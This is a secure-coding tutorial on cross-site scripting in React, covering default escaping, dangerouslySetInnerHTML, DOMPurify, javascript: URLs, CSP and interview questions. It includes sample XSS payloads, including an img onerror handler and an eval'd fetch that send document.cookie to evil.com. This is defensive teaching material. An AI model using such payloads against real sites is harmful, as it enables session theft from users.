# XSS in React

## What is XSS

Cross-Site Scripting (XSS) is an attack where an attacker injects malicious JavaScript into a page that gets executed in another user's browser. The attacker's script runs with the full privileges of the page — it can steal session tokens, send requests as the user, read DOM content, or redirect to phishing sites.

---

## React's Default Protection

React escapes all dynamic content by default. When you render a string, React converts HTML special characters to their entity equivalents before inserting them into the DOM.

```tsx
const userInput = '<script>alert("XSS")</script>';

// Safe — React escapes this to plain text
return <div>{userInput}</div>;
// DOM output: <div>&lt;script&gt;alert("XSS")&lt;/script&gt;</div>
// Browser renders: the literal text, not executable script
```

This protection covers virtually all normal JSX rendering. React uses `textContent` (not `innerHTML`) when setting text nodes, which browsers never parse as HTML.

---

## `dangerouslySetInnerHTML` — The Escape Hatch

React's protection breaks the moment you use `dangerouslySetInnerHTML`. The name is intentional — it's meant to feel uncomfortable to type.

```tsx
// DANGEROUS — if content is user-supplied, this is an XSS vector
function RichText({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// Attack scenario
const attackerContent = '<img src=x onerror="document.location=\'https://evil.com/?c=\'+document.cookie">';
<RichText html={attackerContent} />
// ❌ The browser executes the onerror handler, exfiltrating cookies
```

**When `dangerouslySetInnerHTML` is legitimate:** Rendering HTML from a trusted CMS, email templates, or a WYSIWYG editor where you need real HTML. The rule is: if the HTML came from a user or any untrusted source, sanitize it first.

---

## Sanitizing HTML

Use a library that parses HTML and strips dangerous elements and attributes before rendering.

```tsx
import DOMPurify from 'dompurify';

function SafeRichText({ html }: { html: string }) {
  const sanitized = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
    ALLOWED_ATTR: ['href', 'target', 'rel'],
  });

  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

**Why DOMPurify?** It uses the browser's own HTML parser to build the DOM tree, then removes unsafe nodes. It doesn't try to regex-parse HTML (which always has edge cases) — it leverages the same engine the browser uses.

**Always set `rel="noopener noreferrer"` on external links** to prevent the opened tab from accessing `window.opener` (a separate but related attack vector).

---

## Other XSS Vectors in React

### href with javascript: protocol

```tsx
// XSS via javascript: URL
const userUrl = 'javascript:alert(document.cookie)';

// ❌ React will render this — it's valid HTML but executes JS on click
<a href={userUrl}>Click me</a>

// ✅ Validate URLs before rendering links
function SafeLink({ href, children }: { href: string; children: React.ReactNode }) {
  const isSafe = href.startsWith('https://') || href.startsWith('http://');
  return isSafe ? <a href={href}>{children}</a> : <span>{children}</span>;
}
```

React 16.9+ added a warning for `javascript:` URLs in `href`, `src`, and `action` attributes, but does not block them.

### Direct DOM manipulation

```tsx
// Bypasses React entirely — XSS if content is untrusted
const ref = useRef<HTMLDivElement>(null);

useEffect(() => {
  if (ref.current) {
    ref.current.innerHTML = userContent; // ❌ bypasses React escaping
  }
}, [userContent]);

// Use dangerouslySetInnerHTML + DOMPurify instead, or textContent for plain text
```

### eval and `new Function`

```tsx
// Never do this with user-supplied strings
const userCode = "fetch('https://evil.com?c='+document.cookie)";
eval(userCode); // ❌

// Same risk with new Function, setTimeout with string arg, etc.
```

---

## Content Security Policy

CSP is a defense-in-depth layer — a response header that tells the browser which origins scripts can be loaded from and whether `eval`/`inline` scripts are allowed.

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none';
```

Even if an attacker injects `<script>`, CSP prevents the browser from executing it if it doesn't have the right nonce. React 18 added nonce support for streaming server rendering.

CSP doesn't replace sanitization — it's a second line of defense if sanitization fails.

---

> **Check yourself:** Your CMS returns HTML from a WYSIWYG editor for a marketing page. A non-technical editor pasted content from a Word document that included a tracking pixel. Is this a security issue, or just a hygiene problem? A tracking pixel `<img>` isn't inherently XSS (it doesn't execute JS), but you should still sanitize to your allowlist — otherwise an attacker who gains CMS access can inject actual XSS. The sanitizer should be applied regardless of whether you trust the author.

---

## Self-Assessment

- [ ] I can explain how React escapes output by default
- [ ] I know exactly when `dangerouslySetInnerHTML` is necessary vs. avoidable
- [ ] I know how to sanitize HTML with DOMPurify and why regex-based sanitization is insufficient
- [ ] I know about the `javascript:` URL vector
- [ ] I understand what CSP does and how it complements (not replaces) sanitization

---

## Interview Q&A

**Q: Is React safe from XSS by default? `High`**

A: For normal JSX rendering, yes — React escapes all dynamic content before inserting it as text nodes, so user-supplied strings render as literal text. The protection breaks with `dangerouslySetInnerHTML`, direct DOM manipulation (`innerHTML`), or `javascript:` URLs in anchor hrefs. React makes XSS easy to avoid but doesn't make it impossible — you can still opt out of the protections.

---

**Q: When would you use `dangerouslySetInnerHTML` and how do you make it safe? `High`**

A: When you need to render real HTML — typically content from a CMS, rich text editor, or email template where the HTML structure matters (bold, links, lists). To make it safe: sanitize with DOMPurify before rendering, configure an explicit allowlist of tags and attributes, and never pass unsanitized user input. The `dangerouslySetInnerHTML` prop is named that way intentionally — to force a conscious decision.

---

**Q: Why isn't regex-based HTML sanitization sufficient? `Medium`**

A: HTML is not a regular language — it has too many parsing edge cases that regex can't handle. Browsers have complex parsing quirks (malformed tags, encoding tricks, attribute injection between tags) that attackers exploit specifically to bypass regex filters. DOMPurify uses the actual browser HTML parser, which means it handles exactly the same edge cases the browser would — there's no gap between "what the sanitizer parsed" and "what the browser renders."

---

**Q: What is a Content Security Policy and how does it relate to XSS prevention? `Medium`**

A: CSP is an HTTP response header that instructs the browser to only execute scripts from trusted origins or with valid nonces/hashes. It's a defense-in-depth layer — if an XSS vulnerability exists and an attacker injects a script tag, CSP can prevent the browser from executing it. CSP doesn't replace input sanitization; it limits the damage if sanitization fails.
